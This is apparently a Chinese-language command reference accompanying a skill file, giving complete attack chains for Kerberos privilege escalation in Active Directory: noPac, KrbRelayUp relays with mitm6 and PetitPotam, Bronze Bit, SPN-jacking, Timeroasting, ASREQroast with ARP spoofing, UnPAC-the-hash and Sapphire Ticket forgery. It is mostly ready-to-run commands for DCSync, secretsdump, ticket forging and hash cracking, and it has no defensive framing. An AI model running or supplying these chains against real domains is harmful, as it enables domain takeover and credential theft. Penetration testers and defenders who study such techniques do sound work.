# Kerberos 高级提权技术完整命令参考

本文档提供 SKILL.md 中各技术的完整命令链和详细参数说明。

---

## sAMAccountName Spoofing (noPac)

### 自动化工具 — noPac.py

```bash
# 扫描是否存在漏洞
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP -scan

# 一键利用 — secretsdump
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -dump

# 使用 LDAPS
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -use-ldap -dump

# 获取 shell
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -shell
```

### 手动链 — UNIX (Impacket)

```bash
# Step 1: 创建机器账户
addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'FakePass123' \
  -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 2: 清除 SPN — 重要! 不清除会因 SPN 唯一性约束导致改名失败
addspn.py --clear -t 'FAKEPC$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 3: 改名为 DC (不带 $)
renameMachine.py -current-name 'FAKEPC$' -new-name "$DC_NAME" \
  -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 4: 用 DC 名申请 TGT
getTGT.py -dc-ip $DC_IP "$DOMAIN/$DC_NAME:FakePass123"

# Step 5: 立即改回 (避免影响域复制)
renameMachine.py -current-name "$DC_NAME" -new-name 'FAKEPC$' \
  -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 6: 用 TGT 做 S4U2self
export KRB5CCNAME="$DC_NAME.ccache"
getST.py -self -impersonate "Administrator" -altservice "cifs/$DC_FQDN" \
  -k -no-pass -dc-ip $DC_IP "$DOMAIN/$DC_NAME"

# Step 7: DCSync
export KRB5CCNAME="Administrator@cifs_$DC_FQDN@$DOMAIN.ccache"
secretsdump.py -k -no-pass -dc-ip $DC_IP "$DC_FQDN"
```

注意事项:
- 清除 SPN 必须在改名之前，否则 LDAP 会拒绝重名 SPN
- 用户账户变体: 如果用户无 SPN，也可直接改名用户账户 (无需创建机器账户)
- 改名后应尽快改回，避免 DC 间复制异常

### 手动链 — Windows

```powershell
# Step 1: 创建机器账户
New-MachineAccount -MachineAccount "FAKEPC" -Password $(ConvertTo-SecureString "FakePass123" -AsPlainText -Force) -Domain $DOMAIN

# Step 2: 清除 SPN
Set-DomainObject "FAKEPC$" -Clear 'servicePrincipalName'

# Step 3: 改名
Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "$DC_NAME" -Attribute samaccountname

# Step 4: 申请 TGT
Rubeus.exe asktgt /user:"$DC_NAME" /password:"FakePass123" /domain:$DOMAIN /dc:$DC_FQDN /nowrap

# Step 5: 改回
Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "FAKEPC$" -Attribute samaccountname

# Step 6: S4U2self
Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/$DC_FQDN" /dc:$DC_FQDN /ptt /ticket:$TGT_BASE64

# Step 7: DCSync
mimikatz.exe "lsadump::dcsync /domain:$DOMAIN /user:Administrator"
```

---

## KrbRelayUp 完整参考

### 基础利用

```bash
# 创建机器账户并配置 RBCD
KrbRelayUp.exe relay -Domain $DOMAIN -CreateNewComputerAccount \
  -ComputerName YOURPC$ -ComputerPassword Pass

# 利用 RBCD 获取票据
KrbRelayUp.exe spawn -m rbcd -d $DOMAIN -dc $DC_FQDN \
  -cn YOURPC$ -cp Pass
```

### 场景 1: DNS 投毒 Relay

```bash
# Terminal 1 — krbrelayx 监听
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP \
  --victim $TARGET_SAMNAME --adcs --template Machine

# Terminal 2 — mitm6 DNS 投毒
mitm6 -i $INTERFACE -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
```

注意: DNS 名称长度限制为 15 字符 (NetBIOS 限制)

### 场景 2: Coerced Auth Relay

```bash
# Step 1: 注册 DNS 记录
dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" \
  -r attacker.$DOMAIN -a add -t A -d $ATTACKER_IP $DC_IP

# Step 2: krbrelayx 监听
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP \
  --victim $TARGET_SAMNAME --adcs --template Machine

# Step 3: 强制认证
PetitPotam.py attacker.$DOMAIN@80/test $TARGET_IP
```

### 场景 3: Multicast Relay

```bash
# Terminal 1 — Responder (仅监听模式)
Responder -I $INTERFACE -A

# Terminal 2 — krbrelayx
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP \
  --victim $TARGET_SAMNAME --adcs --template Machine
```

SPN 类匹配说明: relay 的 SPN class 必须与目标服务匹配 (http→http, cifs→cifs)

---

## Bronze Bit (CVE-2020-17049)

### 利用命令

```bash
# Impacket getST — 强制设置 forwardable 标志
getST.py -force-forwardable \
  -spn "$TARGET_SPN" \
  -impersonate "Administrator" \
  -dc-ip "$DC_IP" \
  -hashes :"$NT_HASH" \
  "$DOMAIN/$SERVICE_ACCOUNT"
```

```bash
# 使用 AES 密钥
getST.py -force-forwardable \
  -spn "$TARGET_SPN" \
  -impersonate "Administrator" \
  -dc-ip "$DC_IP" \
  -aesKey "$AES_KEY" \
  "$DOMAIN/$SERVICE_ACCOUNT"
```

### 使用场景

- 当协议转换 (Protocol Transition) 受限时
- 目标用户在 Protected Users 组
- 目标账户标记 "Account is sensitive and cannot be delegated"
- S4U2self 返回的票据 forwardable=0

### 技术细节

S4U2self 返回的票据用服务账户的密钥加密。攻击者已持有该密钥，因此可以解密票据、修改 forwardable 标志位、重新加密后用于 S4U2proxy。KDC 不会验证该标志是否被篡改（补丁前）。

---

## SPN-jacking 完整参考

### UNIX 完整流程

```bash
# 前置: 确认 KCD 配置
# ServerA$ 配置了到 ServerB 的约束委派
# 攻击者对 ServerC$ 有 WriteSPN 权限

# Step 1: 清除 ServerB 的 SPN
addspn.py --clear -t 'ServerB$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 2: 将 ServerB 的 SPN 添加到 ServerC
addspn.py -t 'ServerC$' --spn "cifs/serverB.$DOMAIN" \
  -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 3: 用 ServerA 做 S4U 请求 ServerB 的 SPN (实际由 ServerC 持有)
getST.py -spn "cifs/serverB.$DOMAIN" -impersonate "Administrator" \
  "$DOMAIN/serverA\$:$PASSWORD"

# Step 4: 编辑票据中的 SPN 指向 ServerC
tgssub.py -in serverB.ccache -out final.ccache -altservice "cifs/serverC.$DOMAIN"

# Step 5: 使用票据
export KRB5CCNAME=final.ccache
smbclient.py -k -no-pass "$DOMAIN/Administrator@serverC.$DOMAIN"
```

### Ghost SPN-jacking

当目标服务器已不存在 (DNS 记录仍在) 时:

```bash
# 直接将 ghost SPN 添加到可控账户
addspn.py -t 'ControlledSvc$' --spn "cifs/ghostserver.$DOMAIN" \
  -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# 获取票据 (无需 tgssub)
getST.py -spn "cifs/ghostserver.$DOMAIN" -impersonate "Administrator" \
  "$DOMAIN/delegator\$:$PASSWORD"
```

### Windows 流程

```powershell
# Step 1-2: 移动 SPN
Set-DomainObject -Identity ServerB$ -Clear servicePrincipalName
Set-DomainObject -Identity ServerC$ -Set @{serviceprincipalname="cifs/serverB.$DOMAIN"}

# Step 3: S4U
Rubeus.exe s4u /ticket:$TGT /impersonateuser:Administrator \
  /msdsspn:"cifs/serverB.$DOMAIN" /altservice:"cifs/serverC.$DOMAIN" /ptt

# Step 4: 验证
dir \\serverC.$DOMAIN\c$
```

---

## Timeroasting 完整参考

### 无认证模式

```bash
# timeroast 工具
python3 timeroast.py "$DC_IP"
python3 timeroast.py "$DC_IP" -o hashes.txt

# netexec 模块
netexec smb "$DC_IP" -M timeroast
netexec smb "$DC_IP" -M timeroast -o OUTPUT=hashes.txt
```

### 认证模式 (Windows)

```powershell
# 基础枚举
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP

# 生成针对性字典 (基于计算机名变形)
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP -GenerateWordlist

# 指定输出
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP -OutputFile C:\temp\hashes.txt
```

### 破解

```bash
# hashcat 模式 31300
hashcat -m 31300 -a 0 -O hashes.txt $WORDLIST --username

# 规则破解 (计算机账户密码通常基于机器名)
hashcat -m 31300 -a 0 -O hashes.txt $WORDLIST -r rules/best64.rule --username
```

目标说明:
- 仅影响使用 RC4 密钥的计算机账户
- AES 密钥不受此攻击影响
- 主要目标: Pre-Windows 2000 计算机、手动设置弱密码的机器账户
- 破解速度约为 Kerberos TGS hash 的 10 倍

---

## ASREQroast 完整参考

### 捕获

```bash
# 实时捕获
Pcredz -i $INTERFACE -v

# 从 pcap 文件
Pcredz -f "$PCAP_FILE"

# 从目录批量
Pcredz -d "$PCAP_DIR"
```

### MITM 位置获取

```bash
# ARP 欺骗
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP

# ICMP 重定向
# 需要自定义脚本或 Scapy

# DHCPv6 投毒
mitm6 -d $DOMAIN -i $INTERFACE
```

### 破解

```bash
# Kerberos AS-REQ Pre-Auth etype 23
hashcat -m 7500 asreq_hashes.txt $WORDLIST

# 带规则
hashcat -m 7500 asreq_hashes.txt $WORDLIST -r rules/best64.rule
```

与 AS-REP Roasting 对比:
- AS-REP Roasting 需要目标禁用预认证
- ASREQroast 针对正常启用预认证的用户
- ASREQroast 需要 MITM 位置
- 两者使用不同 hashcat 模式 (AS-REP: 18200, ASREQroast: 7500)

---

## UnPAC-the-hash 完整参考

### PKINITtools (Linux)

```bash
# Step 1: 使用证书获取 TGT
gettgtpkinit.py -cert-pfx "$CERT_PFX" -pfx-pass "$PFX_PASS" \
  "$DOMAIN/$USER" tgt.ccache
# 输出包含 AS-REP encryption key，记录备用

# Step 2: 从 TGT 提取 NT hash
getnthash.py -key '$AS_REP_KEY' '$DOMAIN'/'$USER'

# 使用 PEM 格式证书
gettgtpkinit.py -cert-pem "$CERT_PEM" -key-pem "$KEY_PEM" \
  "$DOMAIN/$USER" tgt.ccache
```

### Rubeus (Windows)

```powershell
# 一步完成
Rubeus.exe asktgt /getcredentials /user:"$USER" /certificate:"$CERT_PFX" \
  /password:"$PFX_PASS" /domain:"$DOMAIN" /dc:"$DC_FQDN" /show

# 使用 base64 证书
Rubeus.exe asktgt /getcredentials /user:"$USER" /certificate:$CERT_B64 \
  /domain:"$DOMAIN" /dc:"$DC_FQDN" /show
```

典型使用场景:
- ADCS ESC1-ESC8 获取证书后提取 NT hash
- Shadow Credentials 攻击写入 msDS-KeyCredentialLink 后
- 证书认证环境中的凭据持久化

---

## Sapphire Ticket 完整参考

### 伪造命令

```bash
# Impacket ticketer — 带 -request 触发 S4U 获取真实 PAC
ticketer.py -request \
  -impersonate 'domainadmin' \
  -domain '$DOMAIN' \
  -user '$USER' \
  -password '$PASSWORD' \
  -nthash '$KRBTGT_NT' \
  -aesKey '$KRBTGT_AES' \
  -user-id '$TARGET_RID' \
  -domain-sid '$DOMAIN_SID' \
  'baduser'
```

### 票据类型对比

| 特征 | Golden Ticket | Diamond Ticket | Sapphire Ticket |
|------|:------------:|:--------------:|:--------------:|
| PAC 来源 | 完全伪造 | 修改真实 PAC | 真实 PAC (S4U) |
| 需要 krbtgt | AES/NT | AES/NT | AES/NT |
| 检测难度 | 低 | 中 | 高 |
| TGT 来源 | 伪造 | 修改真实 TGT | 伪造+真实PAC |

### KB5008380 补丁影响

补丁后 KDC 验证:
- PAC_REQUESTOR: 票据请求者 SID 必须与 PAC logon info 中的 SID 匹配
- PAC_ATTRIBUTES_INFO: 标记 PAC 是否为完整 PAC
- 缺少这些结构会导致 KDC_ERR_TGT_REVOKED
- Sapphire Ticket 通过 S4U 获取真实 PAC 天然包含这些结构
